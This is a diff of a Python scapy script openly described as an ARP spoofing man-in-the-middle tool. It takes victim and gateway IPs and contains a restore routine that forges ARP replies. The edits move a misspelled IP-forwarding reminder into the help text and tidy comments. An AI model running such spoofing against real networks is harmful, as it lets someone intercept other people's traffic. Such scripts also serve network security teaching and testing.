@@ -9,10 +9,10 @@ def get_arguments():
     parser =  argparse.ArgumentParser(
         prog='ARP Spoofing',
         description='This program performs Man in the Middle Attack, all the dst fields get victim details and src field gets the fetch detail', 
-        epilog='Author : Gemstone Hashghost'
+        epilog='Remember to add cho 1 > /proc/sys/net/ipv4/ip_forward to your Linux Machine to allow ip forwarding'
         )
     parser.add_argument('-t', '--target', dest='target_ip',  help='Victim IP')
-    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Router ip/Gateway IP')
+    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Router IP / Gateway IP')
 
     args = parser.parse_args()
     return args
@@ -40,16 +40,15 @@ def restore(og_source_ip, og_destination_ip):
     destination_mac = get_mac(og_destination_ip)
     packet = scapy.ARP(op=2, pdst=og_destination_ip, hwdst=destination_mac, psrc=og_source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
+
 '''
 The loop will make the response to persist without terminating and keep spoofing continuosly
-Remember to add cho 1> /proc/sys/net/ipv4/ip_forward to your Linux Machine to allow ip forwarding
 '''
 
-# Vaiables for targets
-# target_ip = sys.argv[1]
-# gateway_ip = sys.argv[2]
 
+# Use variable names as declared in the add_argument example args.target_ip
 args = get_arguments()
+
 try:
     packet_count = 0
     while True:
